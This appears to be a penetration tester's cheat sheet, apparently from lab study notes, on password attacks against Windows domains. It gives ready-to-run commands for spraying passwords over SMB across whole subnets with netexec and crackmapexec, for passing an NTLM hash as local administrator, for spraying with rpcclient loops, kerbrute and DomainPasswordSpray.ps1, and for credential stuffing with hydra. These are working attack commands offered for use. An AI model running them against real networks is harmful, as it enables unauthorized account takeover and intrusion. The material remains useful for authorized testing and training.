## Password Spraying from Linux
#### Netexec across network
Spray a password across an entire subnet and a userlist for the smb service.
```shell
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
#### Netexec on one host
```shell
netexec smb 10.100.38.12 -u <usernames.list> -p 'ChangeMe123!' | grep +
```
#### Local Admin Spraying across network with Netexec
```shell
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
#### Bash one liner with RPC Client
```shell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```
#### Kerbrute
```shell
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

---
## Password Spraying from Windows
#### DomainPasswordSpray.ps1
```powershell
PS C:\htb> Import-Module DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

---
## Credential Stuffing

Type of brute force attack in which an attacker uses stolen credentials from one service to attempt to acces an other.
If we have a list of username:password we can try
```shell
hydra -C user_pass.list ssh://10.100.38.23
```

---
## Default Credentials
- Look on google for default creds
- Use the `creds` tool

```shell
creds search <service>
```
